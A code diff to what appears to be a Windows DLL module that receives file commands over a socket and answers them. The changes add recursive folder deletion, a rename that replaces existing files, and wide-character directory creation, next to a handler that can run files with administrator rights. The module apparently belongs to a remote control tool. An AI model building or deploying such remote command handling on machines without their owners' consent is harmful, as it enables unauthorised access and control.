@@ -157,6 +157,27 @@ bool DeleteFileOrDir(const std::string& path) {
     DWORD attr = GetFileAttributesW(wPath.c_str());
     if (attr == INVALID_FILE_ATTRIBUTES) return false;
     if (attr & FILE_ATTRIBUTE_DIRECTORY) {
+        std::wstring searchPath = wPath;
+        if (searchPath.back() != L'\\') searchPath += L"\\";
+        searchPath += L"*";
+        
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
+                
+                std::wstring subPath = wPath;
+                if (subPath.back() != L'\\') subPath += L"\\";
+                subPath += findData.cFileName;
+                
+                if (!DeleteFileOrDir(WideToUTF8(subPath))) {
+                    FindClose(hFind);
+                    return false;
+                }
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+        }
         return RemoveDirectoryW(wPath.c_str());
     } else {
         return DeleteFileW(wPath.c_str());
@@ -166,7 +187,11 @@ bool DeleteFileOrDir(const std::string& path) {
 bool RenameFileOrDir(const std::string& oldPath, const std::string& newPath) {
     std::wstring wOld = UTF8ToWide(oldPath);
     std::wstring wNew = UTF8ToWide(newPath);
-    return MoveFileW(wOld.c_str(), wNew.c_str());
+    if (MoveFileW(wOld.c_str(), wNew.c_str())) return true;
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        if (MoveFileExW(wOld.c_str(), wNew.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)) return true;
+    }
+    return false;
 }
 
 bool RunFile(const std::string& path, bool admin) {
@@ -227,7 +252,8 @@ extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* p
         bool ok = RunFile(pkg->data, admin);
         SendResponse(s, CMD_FILE_RUN, ok ? "SUCCESS" : "FAILED", ok ? 7 : 6);
     } else if (pkg->cmd == CMD_FILE_MKDIR) {
-        bool ok = CreateDirectoryA(pkg->data, NULL);
+        std::wstring wPath = UTF8ToWide(pkg->data);
+        bool ok = CreateDirectoryW(wPath.c_str(), NULL);
         SendResponse(s, CMD_FILE_MKDIR, ok ? "SUCCESS" : "FAILED", ok ? 7 : 6);
     }
 }
